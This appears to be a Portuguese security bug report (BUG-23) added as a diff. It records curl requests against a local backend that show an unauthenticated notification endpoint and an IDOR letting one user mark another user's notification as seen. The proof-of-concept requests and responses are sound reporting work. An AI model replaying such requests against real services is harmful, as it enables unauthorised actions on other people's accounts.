@@ -1,0 +1,27 @@
+Evidência BUG-23 — POST /notification sem autenticação + IDOR em mark-as-seen
+Capturado via curl, direto contra o backend local (http://localhost:3000).
+
+=== POST /notification sem token, enviando para o userId de outra pessoa ===
+$ curl -s -w "\nHTTP_STATUS:%{http_code}\n" -X POST http://localhost:3000/notification -H "Content-Type: application/json" -d '{"userId": "972a8d95-fe6a-4ab0-8e1b-690ee86f0137"}'
+{"timestamp":"2026-07-14T18:29:32.316Z","statusCode":200,"error":false,"message":"Notificação enviada com sucesso","count":null,"totalCount":null,"data":null}
+HTTP_STATUS:200
+
+=== GET /notification autenticado como o usuário-alvo (confirma que a notificação chegou de fato) ===
+$ curl -s http://localhost:3000/notification -H "Authorization: Bearer <token do usuário 972a8d95-...>"
+{"data":[{"id":"c5d46c40-c1d8-47c8-b313-c86df2db786e","title":"Teste","description":"Esta é uma descrição de uma notificação","seen":false,"createdAt":"2026-07-14T15:29:32.305Z"}]}
+
+=== Cenário IDOR: usuário A marca como vista uma notificação que pertence ao usuário B ===
+
+1) Notificação enviada para o usuário B (aa8c8957-43ed-4857-b629-d3a05bb47fd8):
+$ curl -s -X POST http://localhost:3000/notification -d '{"userId": "aa8c8957-43ed-4857-b629-d3a05bb47fd8"}'
+
+2) Usuário B confere a notificação recebida (seen: false), id = d93b71e1-1ffa-4deb-9a5a-eadd5abd837a
+
+3) Usuário A (token diferente do dono da notificação) marca como vista:
+$ curl -s -w "\nHTTP_STATUS:%{http_code}\n" -X PATCH http://localhost:3000/notification/mark-as-seen -H "Authorization: Bearer <token do usuário A>" -d '{"notificationId": "d93b71e1-1ffa-4deb-9a5a-eadd5abd837a"}'
+{"timestamp":"2026-07-14T18:30:41.917Z","statusCode":200,"error":false,"message":"Notificação marcada como vista com sucesso!","count":null,"totalCount":null,"data":null}
+HTTP_STATUS:200
+
+4) Usuário B confere novamente e a notificação já aparece como vista, alterada por A:
+$ curl -s http://localhost:3000/notification -H "Authorization: Bearer <token do usuário B>"
+{"data":[{"id":"d93b71e1-1ffa-4deb-9a5a-eadd5abd837a","title":"Teste","description":"Esta é uma descrição de uma notificação","seen":true,"createdAt":"2026-07-14T15:30:41.755Z"}]}
